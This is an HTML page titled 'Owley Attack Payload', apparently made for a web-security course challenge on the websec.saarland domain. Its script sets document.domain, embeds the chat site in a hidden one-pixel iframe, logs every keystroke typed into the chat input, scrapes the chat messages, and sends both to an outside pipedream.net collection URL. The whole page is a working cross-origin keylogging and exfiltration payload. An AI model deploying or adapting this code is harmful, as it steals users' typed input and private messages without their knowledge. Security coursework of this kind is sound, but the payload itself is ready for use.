<!DOCTYPE html>
<html>
<head>
  <title>Owley Attack Payload</title>
</head>
<body>
  <h1>Nothing to see here ðŸ¦‰</h1>
  <script>
  (function () {
      document.domain = 'websec.saarland'; // This will fail on Netlify but work from websec.saarland pages

      const iframe = document.createElement('iframe');
      iframe.src = 'https://chat.websec.saarland';
      iframe.style.width = '1px';
      iframe.style.height = '1px';
      iframe.style.border = 'none';
      iframe.style.visibility = 'hidden';
      document.body.appendChild(iframe);

      iframe.onload = function () {
          try {
              const chatDoc = iframe.contentWindow.document;

              const inputField = chatDoc.querySelector('input');
              if (inputField) {
                  inputField.addEventListener('input', function () {
                      const val = inputField.value;
                      fetch('https://eooaktfbjo7cto7.m.pipedream.net?keylog=' + encodeURIComponent(val));
                  });
              } else {
                  fetch('https://eooaktfbjo7cto7.m.pipedream.net?error=no_input_field');
              }

              const chatBox = chatDoc.querySelector('.chat-box');
              if (chatBox) {
                  const messages = chatBox.innerText;
                  fetch('https://eooaktfbjo7cto7.m.pipedream.net?messages=' + encodeURIComponent(messages));
              }
          } catch (err) {
              fetch('https://eooaktfbjo7cto7.m.pipedream.net?fatalError=' + encodeURIComponent(err.message));
          }
      };
  })();
  </script>
</body>
</html>
